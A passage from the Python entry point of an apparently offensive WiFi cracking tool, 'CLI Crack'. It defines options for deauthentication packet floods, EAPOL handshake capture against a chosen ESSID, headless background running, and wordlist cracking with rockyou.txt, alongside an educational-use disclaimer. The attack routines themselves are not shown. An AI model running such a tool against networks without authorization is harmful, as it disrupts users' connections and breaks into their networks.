    │       detected.                                            │
    │                                                            │
    │  LEGAL DISCLAIMER:                                         │
    │    This tool is provided for educational and authorized    │
    │    security testing purposes only. Unauthorized use to     │
    │    access networks or data without permission is illegal   │
    │    and punishable by law. The author assumes no            │
    │    responsibility for any misuse or damage caused by this  │
    │    software. Use responsibly and ethically.                │
    └────────────────────────────────────────────────────────────┘
    """,
        formatter_class=RawFormatter
    )

    parser.add_argument(
        "--version", 
        action="version", 
        version=f"CLI Crack {__version__}"
    )

    parser.add_argument(
        "--mode",
        choices=["config", "collect-manual", "collect-auto", "process-manual", "process-auto", "full-manual", "full-auto", "target"],
        required=True,
        help="Specific tool mode for refined behavior and use-case."
    )

    parser.add_argument(
        "--verbose", "-v",
        action="store_true",
        help="Enable verbose output for subprocess commands. Note this will result in extremely large log files."
    )

    parser.add_argument(
        "-IS", "--initial-scan",
        metavar="INITIAL SCAN TIME",
        type=int,
        default=30,
        required=False,
        help="Initial spectrum sweep time in seconds (s). (Default is 30)"
    )

    parser.add_argument(
        "-TS", "--target-scan",
        metavar="TARGET SCAN TIME",
        type=int,
        default=60,
        required=False,
        help="Target handshake monitoring time in seconds (s). (Default is 60)"
    )

    parser.add_argument(
        "-p", "--packets",
        metavar="DEAUTH PACKETS",
        type=int,
        default=100,
        required=False,
        help="Deauth Packet count sent during handshake monitoring. (Default is 100)"
    )

    parser.add_argument(
        "-TID", "--target-id",
        metavar="ESSID",
        type=str,
        help="Specific ESSID to target. Only valid in 'target' mode. Filenames may use a sanitized version of the ESSID for safety (e.g., spaces replaced). Refer to logs for accurate matching."
    )

    parser.add_argument(
        "-TSA", "--target-search-attempts",
        metavar="TARGET SEARCH ATTEMPTS",
        type=int,
        default=50,
        help="Number of target search attempts before giving up on --target. (Default is 50)"
    )

    parser.add_argument(
        "-TA", "--target-attempts",
        metavar="CAPTURE ATTEMPTS",
        type=int,
        default=10,
        help="Number of deauth attacks to capture an EAPOL handshake before giving up on --target. (Default is 10)"
    )

    parser.add_argument(
        "-H", "--headless",
        action="store_true",
        help="Activates headless background operation for log-only status."
    )
    
    parser.add_argument(
        "-WL", "--word-list",
        metavar="WORD LIST",
        type=str,
        default="rockyou.txt",
        required=False,
        help="Specifies path to custom wordlist. (Default is 'rockyou.txt')"
    )

    args = parser.parse_args()
    # Enforce that --headless is only valid with auto modes
    if args.headless and not args.mode.endswith("-auto"):
        parser.error("--headless is only allowed with '-auto' modes.")
    if args.target_id and not args.mode in ["target"]:
        parser.error("--target-id can only be used with 'target' mode.")
    if args.mode == "target" and not args.target_id:
        parser.error("--target-id is required when using 'target' mode.")

    if args.headless and not is_running_under_nohup():
        reexec_with_nohup()
    
    suite = wifi_cracker()
    suite.verbose = args.verbose  # Apply global verbose setting
    suite.packets = args.packets
    suite.initial_scan = args.initial_scan
    suite.target_scan = args.target_scan
    suite.headless = args.headless
    suite.word_list = args.word_list
    suite.target_essid = args.target_id
    suite.target_scan_attempts = args.target_search_attempts
    suite.capture_attempts = args.target_attempts

    
    if '-' in args.mode:
        mode_type, mode_subtype = args.mode.split('-')
    else:
        mode_type, mode_subtype = args.mode, None

    if not os.path.isfile(suite.word_list) and mode_type in ["process", "full"]:
                parser.error(f"Wordlist not found at path: {suite.word_list}")
    

    suite.log(f"CLI CRACKER VERSION {__version__}", prefix="blank")
    suite.log(f"MODE: {args.mode}", prefix="blank")

    suite.initial_config()

    if mode_type == "config":
        suite.configure_interface()

    elif mode_type == "collect":
        suite.collect(mode=mode_subtype)

    elif mode_type == "process":
        suite.process_all(mode=mode_subtype)
    
    elif mode_type == "full":
        suite.collect(mode=mode_subtype)
        suite.process_all(mode=mode_subtype)
    
    elif mode_type == "target":
        suite.collect()

    suite.log(f"Mode: {args.mode} COMPLETE", prefix="blank")
    
    """
    To Do:
    specific targeted network
    - dB filtering
    """
